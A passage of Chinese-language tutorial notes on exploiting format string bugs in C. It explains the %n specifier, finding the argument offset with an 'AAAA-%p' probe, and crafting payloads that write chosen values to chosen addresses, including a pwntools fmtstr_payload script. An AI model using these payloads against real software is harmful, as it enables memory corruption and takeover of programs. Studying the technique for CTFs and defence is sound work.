一般指的是 `printf(format, ...)` 里的 `format`
## 格式化字符串写入

这听起来很反直觉，格式化字符串不是用来输出的么？但实际上有这么一个占位符 `%n` ：
- **它的功能**：将“到目前为止已经成功打印的**字符个数**”写入到一个变量中。
- **它的要求**：它对应的参数必须是一个**指针（内存地址）**。

举个简单的例子：
```C
int count = 0;
printf("Hello%n", &count); 
// 运行后，count 的值会变成 5，因为 "Hello" 是 5 个字符。
```

### 怎么控制写入地址？
这主要确认的是 `printf` 认为你的输入是第几个参数。

操作方法：
1. **发送特征码**：输入一串容易辨认的数据，比如 `AAAA` 后面跟着一串 `%p`。
    - 输入：`AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p`
2. **观察输出**：查看输出结果中，哪一个 `%p` 打印出了 `0x41414141`（即 `AAAA`）。
3. **确定序号**：如果第 7 个 `%p` 输出的是 `0x41414141`，那么你的 **偏移量（Offset）** 就是 **7**。

> [!tip] 技巧 直接使用 `7$` 可以跳过前面的参数。例如 `%7$p` 会直接打印出偏移为 7 的位置的数据。

### 怎么控制写入的内容？
你想要写入的数值，必须通过 `printf` 已经打印的 **总字符数** 来控制。

**计算公式**：
假设你想写入数值 $X$，偏移量为 $k$，目标地址为 `addr`：
1. Payload 的开头放入 `p32(addr)`（占 4 字节）。
2. 后面跟上 `%[X-4]c`（用来凑够总数到 $X$）。
3. 最后跟上 `%k$n`。
**例子**：想在偏移 7 的位置写入 16（即 `0x10`）：
- 已写：地址占了 4 字节。
- 需补：$16 - 4 = 12$ 字节。
- Payload：`p32(addr) + b"%12c" + b"%7$n"`
- 当你发送 `b"%12c"`：`printf` 看到一个指令，它会打印一个字符（可能是随机的），但强制要求这个字符**占用 12 个字符的宽度**（不足的部分补空格）。计数器同样 **+12**。

### 由于这个过程很无脑，可以用pwntools一键完成
```python
from pwn import *

# 1. 确定偏移 (可以通过程序逻辑自动探测，也可以手动填入)
offset = 7 

# 2. 确定地址和目标值 {地址: 目标值}
writes = {0x0804a030: 16}

# 3. 自动生成 Payload
# 它会自动使用 %hhn (按字节写) 来优化长度，防止打印几亿个空格导致死机
payload = fmtstr_payload(offset, writes)

p.sendline(payload)
```
